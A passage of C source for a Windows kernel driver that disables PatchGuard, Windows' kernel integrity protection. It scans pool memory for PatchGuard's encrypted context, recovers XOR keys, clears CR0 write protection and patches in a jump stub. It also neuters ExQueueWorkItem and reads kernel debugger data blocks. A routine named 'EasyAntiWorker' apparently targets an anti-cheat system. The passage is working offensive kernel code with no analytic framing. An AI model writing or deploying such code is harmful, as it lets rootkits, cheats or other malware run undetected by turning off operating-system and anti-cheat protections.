		LOG_DEBUG("Find Section Failed\r\n");
		return;
	}
	//找key1，key2
	if (pScan)
	{
		for (DWORD i = 0; i < ScanSize; i++)
		{
			if (*(DWORD64*)(&pScan[i]) == PreKey1
				&& ScanSize > i + 0x800 + 0x10)
			{
				PreKey2 = *(DWORD64*)(&pScan[i + 8]);
				Key1 = *(DWORD64*)(&pScan[i + 0x800]);
				Key2 = *(DWORD64*)(&pScan[i + 0x800 + 8]);
				break;
			}
		}
	}
}
VOID
NewExQueueWorkItem(
	_Inout_ __drv_aliasesMem PWORK_QUEUE_ITEM WorkItem,
	_In_ WORK_QUEUE_TYPE QueueType
)
{
	return;
}
ULONG_PTR NewExecPatchGuard(ULONG_PTR Unuse, ULONG_PTR Context)
{
	for (auto i = 0x0E8; i < 0x120; i += 8)
	{
		if (*(ULONG_PTR*)(Context + i) == g_ExQueueWorkItem)
		{
			*(ULONG_PTR*)(Context + i) = (ULONG_PTR)NewExQueueWorkItem;
			break;
		}
	}
	return Context;
}
BOOLEAN PocScanPg(PVOID BaseAddress, SIZE_T _Size, BOOLEAN bBigPool)
{
	if (!bBigPool)
	{
		if (_Size == PAGE_SIZE)
		{
			PUCHAR pAccessPage = (PUCHAR)BaseAddress + _Size + 0x800;
			if (MmIsAddressValid(pAccessPage))
			{
				_Size += PAGE_SIZE;
			}
		}
	}
	for (size_t i = 0; i < _Size; i++)
	{
		//下面攻击密文pg

		if ((i + 0x800 + 0x10) < _Size
			&& (ULONG_PTR)((PUCHAR)BaseAddress + i + 0x800 + 0x10) > (ULONG_PTR)BaseAddress
			&& MmIsAddressValid(((PUCHAR)BaseAddress + i))
			&& MmIsAddressValid(((PUCHAR)BaseAddress + i + 0x8))
			&& MmIsAddressValid(((PUCHAR)BaseAddress + i + 0x800))
			&& MmIsAddressValid(((PUCHAR)BaseAddress + i + 0x800 + 0x8))
			)
		{
			DWORD64 TempKey1 = *(ULONG_PTR*)((PUCHAR)BaseAddress + i) ^ PreKey1;
			DWORD64 TempKey2 = *(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x8) ^ PreKey2;
			if ((*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x800) ^ Key1) == TempKey1 &&
				(*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x800 + 0x8) ^ Key2) == TempKey2)
			{
				LOG_DEBUG("ExecPatchGuard address:%p    TempKey1:%p    TempKey2:%p\n", (PUCHAR)BaseAddress + i, TempKey1, TempKey2);
				UCHAR Code[0x10] = { 0 };
				memcpy(Code, "\x48\xB8\x21\x43\x65\x87\x78\x56\x34\x12\xFF\xE0\x90\x90\x90\x90", 0x10);
				//MakeWriteAble

				*(ULONG_PTR*)(Code + 0x2) = (ULONG_PTR)g_FreePg;
				_disable();
				__writecr0(__readcr0() & (~(0x10000)));
				*(ULONG_PTR*)((PUCHAR)BaseAddress + i) = *(ULONG_PTR*)Code ^ TempKey1;
				*(ULONG_PTR*)((PUCHAR)BaseAddress + i + 0x8) = *(ULONG_PTR*)(Code + 0x8) ^ TempKey2;
				__writecr0(__readcr0() ^ 0x10000);
				_enable();
				return TRUE;
			}
		}
	}
	return FALSE;
}





void disable_pg_bigPool()
{
	//使用BigPool版本
	if (!Key1 || !Key2)
	{
		get_key();
	}
	if (!Key1 || !Key2)
	{
		LOG_DEBUG("Find Key Failed\r\n");
		return;
	}
	if (!g_FreePg)
	{
		g_FreePg = ExAllocatePoolWithTag(NonPagedPool, 0x10, 'fktp');
		if (!g_FreePg)
		{
			LOG_DEBUG("Allocate Free Pg Failed\r\n");
			return;
		}
		UCHAR _FreePg[] = { 0x48,0x83,0xC4,0x30,0xC3 };
		RtlCopyMemory(g_FreePg, _FreePg, sizeof(_FreePg));
	}
	LOG_DEBUG("Key1=%p Key2=%p\r\n", Key1, Key2);

	UNICODE_STRING RoutineString;
	RtlInitUnicodeString(&RoutineString, L"ExQueueWorkItem");
	g_ExQueueWorkItem = (ULONG_PTR)MmGetSystemRoutineAddress(&RoutineString);
	if (g_ExQueueWorkItem == 0)
	{
		return;
	}
	//g_ExQueueWorkItem = (ULONG_PTR)ddk::util::get_proc_address("ExQueueWorkItem");
	ULONG nSize = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemBigPoolInformation, 0, 0, &nSize);
	if (nSize == 0)
	{
		LOG_DEBUG("error ZwQuerySystemInformation nSize == 0");
		return;
	}
	PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo = ExAllocatePoolWithTag(PagedPool, nSize + PAGE_SIZE, 'tag');
	RtlZeroMemory(pBigPoolInfo, nSize + PAGE_SIZE);
	ULONG rLong = 0;
	status = ZwQuerySystemInformation(SystemBigPoolInformation, pBigPoolInfo, nSize + PAGE_SIZE, &rLong);

	if (!NT_SUCCESS(status))
	{
		LOG_DEBUG("error ZwQuerySystemInformation nSize == 0");
		return;
	}
	if (pBigPoolInfo)
	{
		for (ULONG i = 0; i < pBigPoolInfo->Count; i++) {
			SYSTEM_BIGPOOL_ENTRY poolEntry = pBigPoolInfo->AllocatedInfo[i];
			if (poolEntry.SizeInBytes >= ScanMinSize)
			{

				if (MmIsAddressValid(poolEntry.VirtualAddress))
				{
					if (PocScanPg(poolEntry.VirtualAddress, poolEntry.SizeInBytes, TRUE))
					{
						LOG_DEBUG("Tag: %.*s, Address: 0x%p, Size: 0x%p\r\n", 4,
							poolEntry.Tag, poolEntry.VirtualAddress, (PVOID)poolEntry.SizeInBytes);
					}
				}
			}
		}
	}
	ExFreePoolWithTag(pBigPoolInfo, 'tag');
}

//




typedef struct _WORK_PG
{
	WORK_QUEUE_ITEM Worker;
	ULONGLONG iCALL;
}WORK_PG;




#define DELAY_ONE_MICROSECOND 	(-10)
#define DELAY_ONE_MILLISECOND	(DELAY_ONE_MICROSECOND*1000)
VOID wSleep(LONG msec)
{
	LARGE_INTEGER my_interval;
	my_interval.QuadPart = DELAY_ONE_MILLISECOND;
	my_interval.QuadPart *= msec;
	KeDelayExecutionThread(KernelMode, 0, &my_interval);
}



typedef struct _KDDEBUGGER_DATA_ADDITION64 {

	// Longhorn addition

	ULONG64   VfCrashDataBlock;
	ULONG64   MmBadPagesDetected;
	ULONG64   MmZeroedPageSingleBitErrorsDetected;

	// Windows 7 addition

	ULONG64   EtwpDebuggerData;
	USHORT    OffsetPrcbContext;

	// Windows 8 addition

	USHORT    OffsetPrcbMaxBreakpoints;
	USHORT    OffsetPrcbMaxWatchpoints;

	ULONG     OffsetKThreadStackLimit;
	ULONG     OffsetKThreadStackBase;
	ULONG     OffsetKThreadQueueListEntry;
	ULONG     OffsetEThreadIrpList;

	USHORT    OffsetPrcbIdleThread;
	USHORT    OffsetPrcbNormalDpcState;
	USHORT    OffsetPrcbDpcStack;
	USHORT    OffsetPrcbIsrStack;

	USHORT    SizeKDPC_STACK_FRAME;

	// Windows 8.1 Addition

	USHORT    OffsetKPriQueueThreadListHead;
	USHORT    OffsetKThreadWaitReason;

	// Windows 10 RS1 Addition

	USHORT    Padding;
	ULONG64   PteBase;

	// Windows 10 RS5 Addition

	ULONG64 RetpolineStubFunctionTable;
	ULONG RetpolineStubFunctionTableSize;
	ULONG RetpolineStubOffset;
	ULONG RetpolineStubSize;

}KDDEBUGGER_DATA_ADDITION64, * PKDDEBUGGER_DATA_ADDITION64;


typedef struct _DBGKD_DEBUG_DATA_HEADER64 {

	//
	// Link to other blocks
	//

	LIST_ENTRY64 List;

	//
	// This is a unique tag to identify the owner of the block.
	// If your component only uses one pool tag, use it for this, too.
	//

	ULONG           OwnerTag;

	//
	// This must be initialized to the size of the data block,
	// including this structure.
	//

	ULONG           Size;

} DBGKD_DEBUG_DATA_HEADER64, * PDBGKD_DEBUG_DATA_HEADER64;

typedef struct _KDDEBUGGER_DATA64 {

	DBGKD_DEBUG_DATA_HEADER64 Header;

	//
	// Base address of kernel image
	//

	ULONG64   KernBase;

	//
	// DbgBreakPointWithStatus is a function which takes an argument
	// and hits a breakpoint.  This field contains the address of the
	// breakpoint instruction.  When the debugger sees a breakpoint
	// at this address, it may retrieve the argument from the first
	// argument register, or on x86 the eax register.
	//

	ULONG64   BreakpointWithStatus;       // address of breakpoint

	//
	// Address of the saved context record during a bugcheck
	//
	// N.B. This is an automatic in KeBugcheckEx's frame, and
	// is only valid after a bugcheck.
	//

	ULONG64   SavedContext;

	//
	// help for walking stacks with user callbacks:
	//

	//
	// The address of the thread structure is provided in the
	// WAIT_STATE_CHANGE packet.  This is the offset from the base of
	// the thread structure to the pointer to the kernel stack frame
	// for the currently active usermode callback.
	//

	USHORT  ThCallbackStack;            // offset in thread data

	//
	// these values are offsets into that frame:
	//

	USHORT  NextCallback;               // saved pointer to next callback frame
	USHORT  FramePointer;               // saved frame pointer

	//
	// pad to a quad boundary
	//
	USHORT  PaeEnabled : 1;

	//
	// Address of the kernel callout routine.
	//

	ULONG64   KiCallUserMode;             // kernel routine

	//
	// Address of the usermode entry point for callbacks.
	//

	ULONG64   KeUserCallbackDispatcher;   // address in ntdll


	//
	// Addresses of various kernel data structures and lists
	// that are of interest to the kernel debugger.
	//

	ULONG64   PsLoadedModuleList;
	ULONG64   PsActiveProcessHead;
	ULONG64   PspCidTable;

	ULONG64   ExpSystemResourcesList;
	ULONG64   ExpPagedPoolDescriptor;
	ULONG64   ExpNumberOfPagedPools;

	ULONG64   KeTimeIncrement;
	ULONG64   KeBugCheckCallbackListHead;
	ULONG64   KiBugcheckData;

	ULONG64   IopErrorLogListHead;

	ULONG64   ObpRootDirectoryObject;
	ULONG64   ObpTypeObjectType;

	ULONG64   MmSystemCacheStart;
	ULONG64   MmSystemCacheEnd;
	ULONG64   MmSystemCacheWs;

	ULONG64   MmPfnDatabase;
	ULONG64   MmSystemPtesStart;
	ULONG64   MmSystemPtesEnd;
	ULONG64   MmSubsectionBase;
	ULONG64   MmNumberOfPagingFiles;

	ULONG64   MmLowestPhysicalPage;
	ULONG64   MmHighestPhysicalPage;
	ULONG64   MmNumberOfPhysicalPages;

	ULONG64   MmMaximumNonPagedPoolInBytes;
	ULONG64   MmNonPagedSystemStart;
	ULONG64   MmNonPagedPoolStart;
	ULONG64   MmNonPagedPoolEnd;

	ULONG64   MmPagedPoolStart;
	ULONG64   MmPagedPoolEnd;
	ULONG64   MmPagedPoolInformation;
	ULONG64   MmPageSize;

	ULONG64   MmSizeOfPagedPoolInBytes;

	ULONG64   MmTotalCommitLimit;
	ULONG64   MmTotalCommittedPages;
	ULONG64   MmSharedCommit;
	ULONG64   MmDriverCommit;
	ULONG64   MmProcessCommit;
	ULONG64   MmPagedPoolCommit;
	ULONG64   MmExtendedCommit;

	ULONG64   MmZeroedPageListHead;
	ULONG64   MmFreePageListHead;
	ULONG64   MmStandbyPageListHead;
	ULONG64   MmModifiedPageListHead;
	ULONG64   MmModifiedNoWritePageListHead;
	ULONG64   MmAvailablePages;
	ULONG64   MmResidentAvailablePages;

	ULONG64   PoolTrackTable;
	ULONG64   NonPagedPoolDescriptor;

	ULONG64   MmHighestUserAddress;
	ULONG64   MmSystemRangeStart;
	ULONG64   MmUserProbeAddress;

	ULONG64   KdPrintCircularBuffer;
	ULONG64   KdPrintCircularBufferEnd;
	ULONG64   KdPrintWritePointer;
	ULONG64   KdPrintRolloverCount;

	ULONG64   MmLoadedUserImageList;

	// NT 5.1 Addition

	ULONG64   NtBuildLab;
	ULONG64   KiNormalSystemCall;

	// NT 5.0 QFE addition

	ULONG64   KiProcessorBlock;
	ULONG64   MmUnloadedDrivers;
	ULONG64   MmLastUnloadedDriver;
	ULONG64   MmTriageActionTaken;
	ULONG64   MmSpecialPoolTag;
	ULONG64   KernelVerifier;
	ULONG64   MmVerifierData;
	ULONG64   MmAllocatedNonPagedPool;
	ULONG64   MmPeakCommitment;
	ULONG64   MmTotalCommitLimitMaximum;
	ULONG64   CmNtCSDVersion;

	// NT 5.1 Addition

	ULONG64   MmPhysicalMemoryBlock;
	ULONG64   MmSessionBase;
	ULONG64   MmSessionSize;
	ULONG64   MmSystemParentTablePage;

	// Server 2003 addition

	ULONG64   MmVirtualTranslationBase;

	USHORT    OffsetKThreadNextProcessor;
	USHORT    OffsetKThreadTeb;
	USHORT    OffsetKThreadKernelStack;
	USHORT    OffsetKThreadInitialStack;

	USHORT    OffsetKThreadApcProcess;
	USHORT    OffsetKThreadState;
	USHORT    OffsetKThreadBStore;
	USHORT    OffsetKThreadBStoreLimit;

	USHORT    SizeEProcess;
	USHORT    OffsetEprocessPeb;
	USHORT    OffsetEprocessParentCID;
	USHORT    OffsetEprocessDirectoryTableBase;

	USHORT    SizePrcb;
	USHORT    OffsetPrcbDpcRoutine;
	USHORT    OffsetPrcbCurrentThread;
	USHORT    OffsetPrcbMhz;

	USHORT    OffsetPrcbCpuType;
	USHORT    OffsetPrcbVendorString;
	USHORT    OffsetPrcbProcStateContext;
	USHORT    OffsetPrcbNumber;

	USHORT    SizeEThread;

	ULONG64   KdPrintCircularBufferPtr;
	ULONG64   KdPrintBufferSize;

	ULONG64   KeLoaderBlock;

	USHORT    SizePcr;
	USHORT    OffsetPcrSelfPcr;
	USHORT    OffsetPcrCurrentPrcb;
	USHORT    OffsetPcrContainedPrcb;

	USHORT    OffsetPcrInitialBStore;
	USHORT    OffsetPcrBStoreLimit;
	USHORT    OffsetPcrInitialStack;
	USHORT    OffsetPcrStackLimit;

	USHORT    OffsetPrcbPcrPage;
	USHORT    OffsetPrcbProcStateSpecialReg;
	USHORT    GdtR0Code;
	USHORT    GdtR0Data;

	USHORT    GdtR0Pcr;
	USHORT    GdtR3Code;
	USHORT    GdtR3Data;
	USHORT    GdtR3Teb;

	USHORT    GdtLdt;
	USHORT    GdtTss;
	USHORT    Gdt64R3CmCode;
	USHORT    Gdt64R3CmTeb;

	ULONG64   IopNumTriageDumpDataBlocks;
	ULONG64   IopTriageDumpDataBlocks;

} KDDEBUGGER_DATA64, * PKDDEBUGGER_DATA64;

typedef struct _DUMP_HEADER {
	ULONG Signature;
	ULONG ValidDump;
	ULONG MajorVersion;
	ULONG MinorVersion;
	ULONG_PTR DirectoryTableBase;
	ULONG_PTR PfnDataBase;
	PLIST_ENTRY PsLoadedModuleList;
	PLIST_ENTRY PsActiveProcessHead;
	ULONG MachineImageType;
	ULONG NumberProcessors;
	ULONG BugCheckCode;
	ULONG_PTR BugCheckParameter1;
	ULONG_PTR BugCheckParameter2;
	ULONG_PTR BugCheckParameter3;
	ULONG_PTR BugCheckParameter4;
	CHAR VersionUser[32];

#ifndef _WIN64
	ULONG PaeEnabled;
#endif // !_WIN64

	struct _KDDEBUGGER_DATA64* KdDebuggerDataBlock;
} DUMP_HEADER, * PDUMP_HEADER;

typedef struct _KLDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	PVOID ExceptionTable;
	ULONG ExceptionTableSize;
	// ULONG padding on IA64
	PVOID GpValue;
	PNON_PAGED_DEBUG_INFO NonPagedDebugInfo;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	ULONG Flags;
	USHORT LoadCount;
	USHORT __Unused5;
	PVOID SectionPointer;
	ULONG CheckSum;
	// ULONG padding on IA64
	PVOID LoadedImports;
	PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;


NTSYSAPI
ULONG
NTAPI
KeCapturePersistentThreadState(
	__in PCONTEXT Context,
	__in_opt PKTHREAD Thread,
	__in ULONG BugCheckCode,
	__in ULONG_PTR BugCheckParameter1,
	__in ULONG_PTR BugCheckParameter2,
	__in ULONG_PTR BugCheckParameter3,
	__in ULONG_PTR BugCheckParameter4,
	__in PDUMP_HEADER DumpHeader
);
#ifndef _WIN64
#define KDDEBUGGER_DATA_OFFSET 0x1068
#else
#define KDDEBUGGER_DATA_OFFSET 0x2080
#endif // !_WIN64

#define SEC_IMAGE         0x1000000 






BOOLEAN writeSafeMemory(PVOID adr, PVOID val, DWORD valSize) {
	__try {
		ULONGLONG pBasePage = (ULONGLONG)adr & 0xFFFFFFFFFFFFF000;
		ULONG nearByte = (ULONGLONG)adr & 0xFFF;
		DWORD pageSize = 1;
		if (nearByte + valSize > 0x1000)
		{
			pageSize = (nearByte + valSize) / 0x1000;
			if ((nearByte + valSize) % 0x1000 != 0) {
				pageSize++;
			}
		}
		PMDL pMdl0 = 0;
		PVOID pADRA = LoadMemoryToUser(&pMdl0, (PVOID)pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_EXECUTE_READWRITE);
		if (pADRA == 0)
		{
			
			return FALSE;
		}
		//	KIRQL irql = KeGetCurrentIrql();
		RtlCopyMemory((char*)pADRA + nearByte, val, valSize);
		MmUnmapLockedPages(pADRA, pMdl0);
		IoFreeMdl(pMdl0);
		//__writecr8(irql);
		return TRUE;
	}
	__except (1) {
		//LOG_EXCEPT();
		//__writecr8(irql);
		return FALSE;
	}
	//__writecr8(irql);
	//__debugbreak();
	return FALSE;
}


NTKERNELAPI
NTSTATUS ZwLockVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToLock, ULONG MapType);

NTKERNELAPI
NTSTATUS __stdcall ZwUnlockVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToUnlock, ULONG MapType);

BOOLEAN ReadSafeMemory(PVOID adr, PVOID val, DWORD valSize) {



	//if (adr < MmUserProbeAddress){

	//	RtlCopyMemory(adr, val, valSize);

	//}

	////if (adr < MmUserProbeAddress)
	////{
	////	try
	////	{
	////		ProbeForRead(adr, valSize, 1);
	////		RtlCopyMemory(val, adr, valSize);
	////		return TRUE;
	////	}
	////	__except (EXCEPTION_EXECUTE_HANDLER) {
	////		return FALSE;
	////	}


	////	//NTSTATUS status = ZwLockVirtualMemory(ZwCurrentProcess(), &adr, &valSize, 1);

	////	//LOG_DEBUG("ZwLockVirtualMemory status <%08X>", status);

	////	//if (NT_SUCCESS(status)) {
	////	//	__try {
	////	//		RtlCopyMemory(val, adr, valSize);
	////	//	}
	////	//	__except (1) {
	////	//		ZwUnlockVirtualMemory(ZwCurrentProcess(), &adr, &valSize, 1);
	////	//		return FALSE;

	////	//	}
	////	//	ZwUnlockVirtualMemory(ZwCurrentProcess(), &adr, &valSize, 1);
	////	//	return TRUE;
	////	//}
	////	//return FALSE;
	////}

	__try {
		ULONGLONG pBasePage = (ULONGLONG)adr & 0xFFFFFFFFFFFFF000;
		ULONG nearByte = (ULONGLONG)adr & 0xFFF;
		DWORD pageSize = 1;
		if (nearByte + valSize > 0x1000)
		{
			pageSize = (nearByte + valSize) / 0x1000;
			if ((nearByte + valSize) % 0x1000 != 0) {
				pageSize++;
			}
		}
		PMDL pMdl0 = 0;
		PVOID pADRA = LoadMemoryToUser(&pMdl0, (PVOID)pBasePage, PAGE_SIZE * pageSize, KernelMode, PAGE_READWRITE);
		if (pADRA == 0)
		{
			return FALSE;
		}
		RtlCopyMemory(val, (char*)pADRA + nearByte, valSize);
		MmUnmapLockedPages(pADRA, pMdl0);
		IoFreeMdl(pMdl0);
		return TRUE;
	}
	__except (1) {
		//LOG_EXCEPT();
		return FALSE;
	}
	//__debugbreak();
	return FALSE;
}





PLIST_ENTRY PsActiveProcessHead = 0;






void GetBasePTE() {

	CONTEXT Context = { 0 };
	PDUMP_HEADER DumpHeader = NULL;
	PKDDEBUGGER_DATA64 KdDebuggerDataBlock = NULL;
	PKDDEBUGGER_DATA_ADDITION64 KdDebuggerDataAdditionBlock = NULL;

	Context.ContextFlags = CONTEXT_FULL;

	RtlCaptureContext(&Context);

	DumpHeader = ExAllocatePoolWithTag(NonPagedPool, DUMP_BLOCK_SIZE, 'tag');

	if (NULL != DumpHeader) {
		KeCapturePersistentThreadState(
			&Context,
			NULL,
			0,
			0,
			0,
			0,
			0,
			DumpHeader);

		KdDebuggerDataBlock = (PKDDEBUGGER_DATA64)((UCHAR*)DumpHeader + KDDEBUGGER_DATA_OFFSET);

		KdDebuggerDataAdditionBlock = (PKDDEBUGGER_DATA_ADDITION64)(KdDebuggerDataBlock + 1);

		PTE_BASE = KdDebuggerDataAdditionBlock->PteBase;


		LOG_DEBUG("PTE_BASE  <%p>\n", PTE_BASE);


		PLIST_ENTRY PsLoadedModuleList = (PLIST_ENTRY)KdDebuggerDataBlock->PsLoadedModuleList;
		PsActiveProcessHead = (PLIST_ENTRY)KdDebuggerDataBlock->PsActiveProcessHead;
		//KdDebuggerDataBlock.

		KLDR_DATA_TABLE_ENTRY* KernelDataTableEntry = CONTAINING_RECORD(
			PsLoadedModuleList->Flink,
			KLDR_DATA_TABLE_ENTRY,
			InLoadOrderLinks);
		ExFreePoolWithTag(DumpHeader, 'tag');
	}
}


typedef struct _INFO_FUNCTION {
	PF_BLOCK_COPY pBlockCopy;
	DWORD iSize;
}INFO_FUNCTION, * PINFO_FUNCTION;





typedef struct _BASE_FUNCTION_INFO {

	INFO_FUNCTION	CmpAppendDllSection;



}BASE_FUNCTION_INFO,* PBASE_FUNCTION_INFO;

typedef struct _BASE_INFO{

	BASE_FUNCTION_INFO fBaseInfo;





}BASE_INFO,*PBASE_INFO;



  


void  _Find_Memory_Section(PVOID BaseAddress) {

		char Elm[] = { 0x48, 0xB8,0,0,0,0,0,0x80,0xFF,0xFF, 0xC7 };
		char CmpAppendDllSection[] = { 0x2E ,0x48 , 0x31 , 0x11 ,
					                   0x48 ,0x31 , 0x51 , 0x08 ,
					                   0x48 ,0x31 , 0x51 , 0x10 ,
					                   0x48 ,0x31 , 0x51 , 0x18 };

		const PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)(BaseAddress);
		const PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PUCHAR)(BaseAddress)+dos_header->
			e_lfanew);
		const USHORT section_size = pNtHeader->FileHeader.NumberOfSections;
		const PIMAGE_SECTION_HEADER sections_array = (PIMAGE_SECTION_HEADER)((PUCHAR)(pNtHeader)+sizeof(
			IMAGE_NT_HEADERS));


		char* INITKDBG_base = 0;
		DWORD INITKDBG_Size = 0;


		for (auto i = 0; i < section_size; i++) {
			//INITKDBG
			//char __fastVal[] = { 0x48, 0xB8,0,0,0,0,0,0x80,0xFF,0xFF, 0xC7 };


			char Name[32] = { 0 };

			RtlCopyMemory(Name, sections_array[i].Name, 8);

			//LOG_DEBUG("Base Node Name <%s>\n", Name);




			if (memcmp(sections_array[i].Name, "INITKDBG", sizeof("INITKDBG") - 1) == 0)
			{

				ULONG64 scan_base = (ULONG64)(BaseAddress)+sections_array[i].VirtualAddress;
				LOG_DEBUG(" Virtual pdata <%p>\n", scan_base);
				int scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
				LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].Misc.VirtualSize);
				LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].SizeOfRawData);


				INITKDBG_base = scan_base;
				INITKDBG_Size = sections_array[i].SizeOfRawData;



				DWORD nSize = sections_array[i].SizeOfRawData;
				char* nFindBuffer = _findMemory(scan_base, (DWORD)nSize, Elm, sizeof(Elm));
				while (nFindBuffer)
				{
					DWORD64 fEntry = (DWORD64)__findFuntionEntry(nFindBuffer);
					//LOG_DEBUG("BigPool 1 <%p><%p>\n", ViewBase, nFindBuffer);
					if (fEntry != 0)
					{
						//LOG_DEBUG("BigPool 2 <%p><%p>\n", ViewBase, fEntry);
						uKiTimerDispatch = fEntry;

						KiTimerDispatch[0] = *(DWORD*)(uKiTimerDispatch);
						KiTimerDispatch[1] = *(DWORD*)(uKiTimerDispatch + sizeof(DWORD));
						KiTimerDispatch[2] = *(DWORD*)(uKiTimerDispatch + sizeof(DWORD) * 2);
						//	DbgPrint("KiTimerDispatch :%p \n", va);
						LOG_DEBUG("find  KiTimerDispatch <%p>\n", uKiTimerDispatch);
						//LOG_DEBUG(" BASE + %08X\n", (ULONGLONG)uKiTimerDispatch - (ULONGLONG)search_base);
						LOG_DEBUG("find  KiTimerDispatch1 <%08X>\n", KiTimerDispatch[0]);
						LOG_DEBUG("find  KiTimerDispatch2 <%08X>\n", KiTimerDispatch[1]);
						LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);

					}
					nFindBuffer = _findMemory(nFindBuffer + sizeof(Elm),
						(DWORD)((ULONGLONG)scan_base + nSize - (ULONGLONG)nFindBuffer), Elm, sizeof(Elm));
				}

			}
			else if (memcmp(sections_array[i].Name, "INIT", sizeof("INIT")) == 0)
			{

				ULONG64 scan_base = (ULONG64)(BaseAddress)+sections_array[i].VirtualAddress;
				LOG_DEBUG(" Virtual pdata <%p>\n", scan_base);
				int scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
				LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].Misc.VirtualSize);
				LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].SizeOfRawData);
				DWORD nSize = sections_array[i].SizeOfRawData;

				char* nFindBuffer = _findMemory(scan_base, (DWORD)nSize, CmpAppendDllSection, sizeof(CmpAppendDllSection));

				if (nFindBuffer != 0)
				{

					LOG_DEBUG(" CmpAppendDllSection <%p>\n", nFindBuffer);












				}


				//while (nFindBuffer)
				//{
				//	LOG_DEBUG(" CmpAppendDllSection <%p>\n", nFindBuffer);
				//	nFindBuffer = _findMemory(nFindBuffer + sizeof(CmpAppendDllSection),
				//		(DWORD)((ULONGLONG)scan_base + nSize - (ULONGLONG)nFindBuffer), CmpAppendDllSection, sizeof(CmpAppendDllSection));
				//}


			}










			//else if (memcmp(sections_array[i].Name, ".pdata", sizeof(".pdata") - 1) == 0) {
			//

			//	ULONG64 scan_base = (ULONG64)(ViewBase)+sections_array[i].VirtualAddress;
			//	LOG_DEBUG(" Virtual pdata <%p>\n", scan_base);
			//	int scan_size = max(sections_array[i].SizeOfRawData, sections_array[i].Misc.VirtualSize);
			//	LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].Misc.VirtualSize);
			//	LOG_DEBUG("%d %p\n", __LINE__, sections_array[i].SizeOfRawData);

			//	DWORD nSize = sections_array[i].SizeOfRawData;



			//	for (DWORD E = 0; E < sections_array[i].Misc.VirtualSize - sizeof(RUNTIME_FUNCTION); E += sizeof(RUNTIME_FUNCTION))
			//	{
			//		PRUNTIME_FUNCTION RunTime_Table = (PRUNTIME_FUNCTION)(scan_base + E);

			//		char* BeginAddress = (PVOID)((DWORD64)ViewBase + RunTime_Table->BeginAddress);

			//		char* EndAddress = (PVOID)((DWORD64)ViewBase + RunTime_Table->EndAddress);

			//		DWORD nSizeF = RunTime_Table->EndAddress - RunTime_Table->BeginAddress;


			//		//LOG_DEBUG("<%08X> <%08X> %d\n", RunTime_Table->BeginAddress, RunTime_Table->EndAddress, nSizeF);

			//		if (BeginAddress > INITKDBG_base && EndAddress <= (INITKDBG_base + INITKDBG_Size))
			//		{

			//			LOG_DEBUG("INIKDBG <%08X> <%08X> %d\n", RunTime_Table->BeginAddress, RunTime_Table->EndAddress, nSizeF);
			//		}


			//		if (MmIsAddressValid(BeginAddress) &&
			//			MmIsAddressValid(EndAddress)) {

			//			if (BeginAddress > INITKDBG_base && EndAddress <= (INITKDBG_base + INITKDBG_Size))
			//			{
			//				char* nFindBuffer = _findMemory(BeginAddress, nSizeF, Elm, sizeof(Elm));

			//				if (nFindBuffer != 0)
			//				{
			//					KiTimerDispatch[0] = *(DWORD*)(BeginAddress);
			//					KiTimerDispatch[1] = *(DWORD*)(BeginAddress + sizeof(DWORD));
			//					KiTimerDispatch[2] = *(DWORD*)(BeginAddress + sizeof(DWORD) * 2);
			//					//	DbgPrint("KiTimerDispatch :%p \n", va);
			//					LOG_DEBUG("find  KiTimerDispatch <%08X> <%08X> %d\n", RunTime_Table->BeginAddress, RunTime_Table->EndAddress, nSizeF);
			//					//LOG_DEBUG(" BASE + %08X\n", (ULONGLONG)uKiTimerDispatch - (ULONGLONG)search_base);
			//					LOG_DEBUG("find  KiTimerDispatch1 <%08X>\n", KiTimerDispatch[0]);
			//					LOG_DEBUG("find  KiTimerDispatch2 <%08X>\n", KiTimerDispatch[1]);
			//					LOG_DEBUG("find  KiTimerDispatch3 <%08X>\n", KiTimerDispatch[2]);
			//				}

			//			}

			//		}
			//	}



			//
			//
			//}



		}

}




void
NTAPI
EasyAntiWorker(__inout PVOID Argument)
{

	CONTEXT Context = { 0 };
	PDUMP_HEADER DumpHeader = NULL;
	PKDDEBUGGER_DATA64 KdDebuggerDataBlock = NULL;
	PKDDEBUGGER_DATA_ADDITION64 KdDebuggerDataAdditionBlock = NULL;

	Context.ContextFlags = CONTEXT_FULL;

	RtlCaptureContext(&Context);

	DumpHeader = ExAllocatePoolWithTag(NonPagedPool, DUMP_BLOCK_SIZE, 'tag');

	if (NULL != DumpHeader) {
		KeCapturePersistentThreadState(
			&Context,
			NULL,
			0,
			0,
			0,
			0,
			0,
			DumpHeader);

		KdDebuggerDataBlock = (PKDDEBUGGER_DATA64)((UCHAR*)DumpHeader + KDDEBUGGER_DATA_OFFSET);

		//RtlCopyMemory(
		//	&Rtb->DebuggerDataBlock,
		//	KdDebuggerDataBlock,
		//	sizeof(KDDEBUGGER_DATA64));

		KdDebuggerDataAdditionBlock = (PKDDEBUGGER_DATA_ADDITION64)(KdDebuggerDataBlock + 1);

		//RtlCopyMemory(
		//	&Rtb->DebuggerDataAdditionBlock,
		//	KdDebuggerDataAdditionBlock,
		//	sizeof(KDDEBUGGER_DATA_ADDITION64));

		PTE_BASE = KdDebuggerDataAdditionBlock->PteBase;

		PLIST_ENTRY PsLoadedModuleList = (PLIST_ENTRY)KdDebuggerDataBlock->PsLoadedModuleList;
